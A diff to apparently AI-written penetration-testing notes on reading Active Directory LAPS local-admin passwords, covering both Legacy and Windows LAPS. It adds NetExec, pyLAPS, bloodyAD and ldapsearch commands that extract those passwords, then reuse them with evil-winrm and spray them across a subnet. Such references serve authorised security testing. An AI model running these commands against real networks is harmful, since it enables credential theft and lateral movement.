@@ -12,7 +12,17 @@ Import-Module .\LAPSToolkit.ps1
 # Requires PowerView — Import-Module .\PowerView.ps1 first
 ```
 
-> [!note] **What is LAPS?** LAPS rotates the local Administrator password on domain-joined computers and stores it in AD (`ms-Mcs-AdmPwd` attribute). Only specific users/groups are delegated read access. If your current account has read rights, you get local admin on those machines.
+> [!note] **What is LAPS?** LAPS rotates the local Administrator password on domain-joined computers and stores it in AD. Only specific users/groups are delegated read access. If your current account has read rights, you get local admin on those machines.
+
+> [!warning] **Two LAPS generations — LAPSToolkit only knows the OLD one.** This toolkit reads the **Legacy LAPS** attribute `ms-Mcs-AdmPwd` (the standalone MSI product). Since April 2023, **Windows LAPS** is built into Windows/AD and uses **different attributes** — `Get-LAPSComputers` returns nothing against a Windows-LAPS domain even when you *can* read the password. Know both, and check both attributes:
+>
+> | | Legacy LAPS (MSI) | Windows LAPS (built-in, 2023+) |
+> |---|---|---|
+> | Password attr | `ms-Mcs-AdmPwd` | `msLAPS-Password` (cleartext) / `msLAPS-EncryptedPassword` (DPAPI-NG) |
+> | Expiry attr | `ms-Mcs-AdmPwdExpirationTime` | `msLAPS-PasswordExpirationTime` |
+> | Reads via | LAPSToolkit, PowerView | native `Get-LapsADPassword`, NetExec `--laps`, pyLAPS, bloodyAD |
+>
+> `msLAPS-EncryptedPassword` is DPAPI-NG-encrypted — only the delegated principals can decrypt it (NetExec/`LAPS.py` will if you're one of them). If it comes back as `msLAPS-Password` in cleartext, encryption was never enabled. See the **Windows LAPS** section below.
 
 ---
 
@@ -61,16 +71,53 @@ Get-LAPSComputers | Where-Object {$_.Password} | Select-Object ComputerName, Pas
 
 ---
 
+## Windows LAPS (built-in, 2023+) — reading `msLAPS-Password`
+
+LAPSToolkit won't see these. Use native cmdlets or modern tooling:
+
+```powershell
+# Native cmdlet (Windows LAPS PowerShell module — on any recent domain-joined host)
+Get-LapsADPassword -Identity WKSTN01 -AsPlainText
+# Returns: ComputerName, Account (managed local admin), Password, ExpirationTimestamp
+
+# All computers you can read, via PowerView on the new attributes
+Get-DomainComputer -Properties name,msLAPS-Password,msLAPS-PasswordExpirationTime |
+  Where-Object {$_.'msLAPS-Password'} |
+  Select-Object name, 'msLAPS-Password'
+```
+
+```bash
+# NetExec — the fastest sweep; handles BOTH cleartext and DPAPI-NG-encrypted (if you're delegated)
+nxc ldap <dc-ip> -u jsmith -p 'Password123!' --laps
+nxc smb  <dc-ip> -u jsmith -p 'Password123!' -M laps          # then reuse as local admin
+
+# pyLAPS (p0dalirius) — get / set the managed password from Linux
+python3 pyLAPS.py --action get -d corp.local -u jsmith -p 'Password123!' --dc-ip 10.10.10.10
+
+# bloodyAD — read either attribute
+bloodyAD -u jsmith -p 'Password123!' -d corp.local --host 10.10.10.10 \
+  get object WKSTN01 --attr msLAPS-Password
+
+# ldapsearch — Windows LAPS attribute
+ldapsearch -x -H ldap://<dc-ip> -D 'CORP\jsmith' -w 'Password123!' \
+  -b 'DC=corp,DC=local' '(msLAPS-Password=*)' name msLAPS-Password
+```
+
+> [!tip] **Who can read it?** The BloodHound `ReadLAPSPassword` edge answers this directly for both LAPS generations — run it before hunting by hand. See [[Tools/AD/BloodHound|BloodHound]].
+
+---
+
 ## Using Stolen LAPS Credentials
 
 ```bash
 # Once you have the local Administrator password, use it for lateral movement
 evil-winrm -i <target-ip> -u Administrator -p '<LAPS-password>'
 
-crackmapexec smb <target-ip> -u Administrator -p '<LAPS-password>' --local-auth
+# NetExec (the vault standard; crackmapexec/CME is superseded — nxc is a drop-in)
+nxc smb <target-ip> -u Administrator -p '<LAPS-password>' --local-auth
 
-# Check what else the same password works on (password reuse before LAPS was implemented)
-crackmapexec smb 192.168.1.0/24 -u Administrator -p '<LAPS-password>' --local-auth
+# Spray the same password across the subnet (reuse before/around LAPS rollout)
+nxc smb 192.168.1.0/24 -u Administrator -p '<LAPS-password>' --local-auth
 ```
 
 ---
@@ -78,12 +125,15 @@ crackmapexec smb 192.168.1.0/24 -u Administrator -p '<LAPS-password>' --local-au
 ## Check LAPS Status via Registry (on target)
 
 ```powershell
-# From inside a host — check if LAPS is installed and configured
+# --- Legacy LAPS (MSI) ---
 Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft Services\AdmPwd" -ErrorAction SilentlyContinue
-# AdmPwdEnabled = 1 → LAPS is active on this machine
+# AdmPwdEnabled = 1 → legacy LAPS active on this machine
+Test-Path "C:\Program Files\LAPS\CSE\AdmPwd.dll"        # legacy client DLL
 
-# Check LAPS client DLL
-Test-Path "C:\Program Files\LAPS\CSE\AdmPwd.dll"
+# --- Windows LAPS (built-in, 2023+) ---
+Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\LAPS\State" -ErrorAction SilentlyContinue
+Get-ItemProperty "HKLM:\Software\Microsoft\Policies\LAPS" -ErrorAction SilentlyContinue   # GPO-configured policy
+Get-Command -Module LAPS   # native module present → Windows LAPS in use
 ```
 
 ---
@@ -110,6 +160,10 @@ ldapsearch -x -H ldap://<dc-ip> -D 'DOMAIN\user' -w 'Password' \
 
 ---
 
+> [!note] **See also** — LAPSToolkit is a [[Tools/AD/PowerView|PowerView]] wrapper (import PowerView first). Confirm *who can read* a machine's LAPS password fast with the `ReadLAPSPassword` edge in [[Tools/AD/BloodHound|BloodHound]]. Reuse the recovered local-admin password with [[Tools/Lateral Movement/Evil WinRM|Evil WinRM]] / NetExec (see [[Services/Active Directory/ACL Abuse|ACL Abuse]] for how the read delegation is often granted).
+
+---
+
 *Created: 2026-03-06*
-*Updated: 2026-03-06*
-*Model: claude-sonnet-4-6*
+*Updated: 2026-08-27*
+*Model: claude-opus-5*
